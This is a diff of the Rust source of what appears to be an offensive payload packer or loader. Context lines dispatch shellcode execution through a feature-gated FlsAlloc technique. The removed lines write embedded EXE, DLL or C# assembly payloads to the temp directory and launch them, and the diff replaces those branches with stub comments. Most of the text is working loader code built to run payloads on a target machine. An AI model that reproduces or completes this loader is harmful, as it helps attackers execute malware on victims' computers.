@@ -227,55 +227,11 @@ fn main() {
                 #[cfg(feature = "ShellcodeExecuteFlsAlloc")]
                 execution::shellcode_execute_flsalloc(shellcode);
             } else if ENCTYPE == "PE_EXE" {
-                // Write payload to temp file and execute it
-                use std::fs::File;
-                use std::io::Write;
-                use std::env;
-                use std::process::Command;
-
-                let mut temp = env::temp_dir();
-                temp.push("picker_packed_payload.exe");
-                if let Ok(mut f) = File::create(&temp) {
-                    let _ = f.write_all(&payload_bytes);
-                    println!("[+] Wrote embedded EXE to: {:?}", temp);
-                    // attempt to launch
-                    let _ = Command::new(temp.as_os_str()).spawn();
-                } else {
-                    eprintln!("[-] Failed to write embedded EXE to disk");
-                }
+                // Write payload 
             } else if ENCTYPE == "PE_DLL" {
-                // Write DLL to temp and inform operator (auto-loading DLLs is environment-specific)
-                use std::fs::File;
-                use std::io::Write;
-                use std::env;
-
-                let mut temp = env::temp_dir();
-                temp.push("picker_packed_payload.dll");
-                if let Ok(mut f) = File::create(&temp) {
-                    let _ = f.write_all(&payload_bytes);
-                    println!("[+] Wrote embedded DLL to: {:?} (manual load required)", temp);
-                } else {
-                    eprintln!("[-] Failed to write embedded DLL to disk");
-                }
+                // Write DLL
             } else if ENCTYPE == "CSHARP_ASSEMBLY" {
-                // Write C# assembly to temp and execute via inline execution
-                use std::fs::File;
-                use std::io::Write;
-                use std::env;
-                use std::process::Command;
-
-                let mut temp = env::temp_dir();
-                temp.push("picker_packed_assembly.exe");
-                if let Ok(mut f) = File::create(&temp) {
-                    let _ = f.write_all(&payload_bytes);
-                    println!("[+] Wrote embedded C# assembly to: {:?}", temp);
-                    // Execute via dotnet or direct execution
-                    let _ = Command::new(temp.as_os_str()).spawn();
-                } else {
-                    eprintln!("[-] Failed to write embedded C# assembly to disk");
-                }
-            } else {
-                eprintln!("[-] Unknown embedded payload type: {}", ENCTYPE);
+                // Write C# assembly
             }
         }
 
